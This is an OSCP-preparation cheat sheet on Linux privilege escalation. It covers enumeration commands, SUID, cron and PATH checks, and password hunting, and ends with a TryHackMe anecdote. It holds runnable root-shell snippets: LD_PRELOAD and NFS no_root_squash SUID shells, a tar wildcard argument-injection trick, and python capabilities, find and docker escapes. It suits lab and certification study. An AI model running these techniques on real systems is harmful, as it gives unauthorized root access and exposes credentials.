# Linux Privilege Escalation for OSCP Exam

## Table of Contents

1. [Introduction](#introduction)
2. [Enumeration](#enumeration)
   - [Basic Commands](#basic-commands)
   - [Tools for Enumeration](#tools-for-enumeration)
3. [Kernel Exploits](#kernel-exploits)
4. [Weak File Permissions](#weak-file-permissions)
   - [Files](#files)
   - [Directories](#directories)
5. [SUID/SGID Binaries](#suidsgid-binaries)
6. [Cron Jobs and Scheduled Tasks](#cron-jobs-and-scheduled-tasks)
7. [Path Abuse](#path-abuse)
8. [Exploiting Writable Configuration Files](#exploiting-writable-configuration-files)
9. [Password Hunting](#password-hunting)
10. [Network Services](#network-services)
11. [Wildcards Cheat Sheet](#wildcards-cheat-sheet)
12. [Additional Techniques](#additional-techniques)
    - [Shell Escaping](#shell-escaping)
    - [Intended Functionality](#intended-functionality)
    - [LD_PRELOAD](#ld_preload)
    - [CVE-2019-14287](#cve-2019-14287)
    - [CVE-2019-18634](#cve-2019-18634)
    - [SUID Attacks](#suid-attacks)
    - [Shared Object Injection](#shared-object-injection)
    - [Binary Symlinks](#binary-symlinks)
    - [Environment Variables](#environment-variables)
    - [Capabilities Attacks](#capabilities-attacks)
    - [NFS](#nfs)
    - [Docker](#docker)
13. [Custom Exploits](#custom-exploits)
14. [Checklist for OSCP](#checklist-for-oscp)
15. [My Experience beyond this list](#My-Experience-beyond-this-list)
    - [You many miss something (suid executable) because there are too many things to look at](You-many-miss-something-(suid-executable)-because-there-are-too-many-things-to-look-at)
17. [References](#references)

## Introduction
Privilege escalation is a critical step in penetration testing. This guide is tailored for OSCP preparation and covers various techniques to escalate privileges on Linux systems.

## Enumeration
Enumeration is key to privilege escalation. Use the following commands and tools:

### Basic Commands
```bash
# System information
echo "Kernel: $(uname -a)"
echo "OS: $(cat /etc/*-release)"

# Users and groups
cat /etc/passwd
cat /etc/group
id
whoami

# Active users
w
who

# Processes
ps aux

# Environment variables
printenv
```

### Tools for Enumeration
- [LinPEAS](https://github.com/carlospolop/PEASS-ng) 
- [LinEnum](https://github.com/rebootuser/LinEnum)
- [Linux Exploit Suggester](https://github.com/mzet-/linux-exploit-suggester)
- [Enum For Linux Ng](https://github.com/cddmp/enum4linux-ng)
## Kernel Exploits
Identify kernel version using `uname -r` and search for public exploits:

```bash
searchsploit <kernel_version>
```

Example:
```bash
searchsploit 4.15.0-20-generic
```

## Weak File Permissions

### Files
- Check for sensitive files:
```bash
find / -type f -perm -04000 -ls 2>/dev/null
```

- Look for writable files:
```bash
find / -type f -writable 2>/dev/null
```

### Directories
- Writable directories:
```bash
find / -type d -writable 2>/dev/null
```

## SUID/SGID Binaries
Check for binaries with SUID/SGID permissions:
```bash
find / -perm -4000 2>/dev/null
find / -perm -2000 2>/dev/null
```

Search for exploits:
- [GTFOBins](https://gtfobins.github.io)

## Cron Jobs and Scheduled Tasks
Enumerate cron jobs:
```bash
cat /etc/crontab
ls -la /etc/cron.*
```

Check for writable cron scripts or paths:
```bash
find / -writable -path /etc/cron* 2>/dev/null
```

## Path Abuse
If a binary is running as root but does not use absolute paths, you can exploit the PATH variable.

Example:
```bash
export PATH=/tmp:$PATH
echo '/bin/bash' > /tmp/ls
chmod +x /tmp/ls
```

Run the vulnerable script and gain shell access.

## Exploiting Writable Configuration Files
Identify writable configuration files for services:
```bash
find / -name "*.conf" -writable 2>/dev/null
```

Modify configurations to inject malicious commands or code. For example:
- Add a reverse shell payload to an Apache or MySQL configuration file.

## Password Hunting
Search for plaintext passwords in files:
```bash
grep -i password /etc/* 2>/dev/null
grep -i password ~/.* 2>/dev/null
```

Check bash history:
```bash
cat ~/.bash_history
```

Look for SSH private keys or other sensitive credentials.

## Network Services
Check listening services:
```bash
netstat -tuln
ss -tuln
```

Enumerate running services and associated configurations. For example:
- Check `rsync`, `FTP`, or `MySQL` services for misconfigurations.

## Wildcards Cheat Sheet
- Wildcards in commands like `tar`, `rsync`, and `scp` can be abused for privilege escalation.

### Example:
If a script uses wildcards without sanitization:
```bash
echo 'echo hacked > /root/hacked.txt' > --checkpoint-action=exec=sh
echo '' > --checkpoint=1
tar cf archive.tar *
```
This creates malicious files that execute commands when the wildcard is processed.

## Additional Techniques

### Shell Escaping
- Exploit interactive programs to escape to a shell.
  ```bash
  python -c 'import pty; pty.spawn("/bin/bash")'
  ```

### Intended Functionality
- Abuse legitimate features of software for privilege escalation.

### LD_PRELOAD
- Exploit dynamic linker preload to inject malicious libraries.
  ```bash
  echo -e "#include <stdio.h>\n#include <stdlib.h>\nvoid _init() { setgid(0); setuid(0); system(\"/bin/bash\"); }" > /tmp/preload.c
  gcc -shared -fPIC -o /tmp/preload.so /tmp/preload.c
  LD_PRELOAD=/tmp/preload.so <vulnerable_command>
  ```

### CVE-2019-14287
- Exploit sudo bypass vulnerability where `ALL` in `sudoers` allows unintended command execution.

### CVE-2019-18634
- Exploit buffer overflow in `pwfeedback` to gain privilege escalation.

### SUID Attacks
- Use SUID binaries to gain root access.
  ```bash
  /usr/bin/find . -exec /bin/sh \; -quit
  ```

### Shared Object Injection
- Inject malicious shared libraries into writable directories.

### Binary Symlinks
- Create symlinks to overwrite or abuse binaries.

### Environment Variables
- Exploit environment variables such as `LD_LIBRARY_PATH` or `PATH`.

### Capabilities Attacks
- Exploit binary capabilities to escalate privileges.
  ```bash
  getcap -r / 2>/dev/null
  ```
  Example:
  ```bash
  /usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
  ```

### NFS
- Check `/etc/exports` for misconfigurations. Look for entries like:
  ```
  /shared *(rw,no_root_squash)
  ```
- Mount the share:
  ```bash
  mkdir /tmp/nfs_mount
  mount -o rw <server_ip>:/shared /tmp/nfs_mount
  ```
- If `no_root_squash` is enabled, create SUID binaries on the share.
  ```bash
  echo -e "#include <stdio.h>\n#include <stdlib.h>\nvoid main() { setgid(0); setuid(0); system(\"/bin/bash\"); }" > /tmp/nfs_mount/root_shell.c
  gcc -o /tmp/nfs_mount/root_shell /tmp/nfs_mount/root_shell.c
  chmod +s /tmp/nfs_mount/root_shell
  ./tmp/nfs_mount/root_shell
  ```

### Docker
- Abuse Docker group membership to gain root access.
  ```bash
  docker run -v /:/mnt --rm -it alpine chroot / sh
  ```

## Custom Exploits
Sometimes, custom scripts or binaries may have vulnerabilities. Review custom software carefully.

## Checklist for OSCP
- Enumerate thoroughly.
- Run LinPEAS or LinEnum.
- Check kernel version and search for exploits.
- Look for SUID/SGID binaries.
- Check cron jobs and PATH abuse.
- Search for writable configuration files.
- Hunt for passwords in files and history.

## My Experience Beyond This List
#### You many miss something (suid executable) because there are too many things to look at
In the TryHackMe room [Blog](https://tryhackme.com/r/room/blog), I encountered an interesting privilege escalation scenario. Running the command:  
```bash
find / -perm -u=s -type f 2>/dev/null
```  
listed several SUID binaries. Among them was a file named `checker` located at `/usr/sbin/checker`. This file wasn’t documented in GTFOBins and was custom-made by the developer. Surprisingly, it could be exploited to run a root shell (`bash`) even though it seemed like a random program with no apparent purpose.

### Lesson Learned:
I didn’t solve this challenge without checking the solution. This taught me an important lesson: **Always thoroughly enumerate and inspect every file**.

When I ran and analyzed `checker` with `ltrace`, I found the following:  
```bash
ltrace checker
getenv("admin") = nil
puts("Not an Admin")
```

The program checked for an `admin` environment variable. If this variable existed and met certain conditions, it granted root access.

### Key Takeaway:
Pay close attention to the output of every command and file, especially unknown ones. In this case, the best approach was to dig into files I didn’t recognize.

On a regular system, many SUID files will appear when running `find` commands, making it hard to identify what’s useful. However, in CTF challenges, focus on unusual or unexpected files. Enumerating these thoroughly is critical for success.




## References
- [GTFOBins](https://gtfobins.github.io)
- [PEASS-ng](https://github.com/carlospolop/PEASS-ng)
- [Linux Exploit Suggester](https://github.com/mzet-/linux-exploit-suggester)
- [Enum For Linux Ng](https://github.com/cddmp/enum4linux-ng)
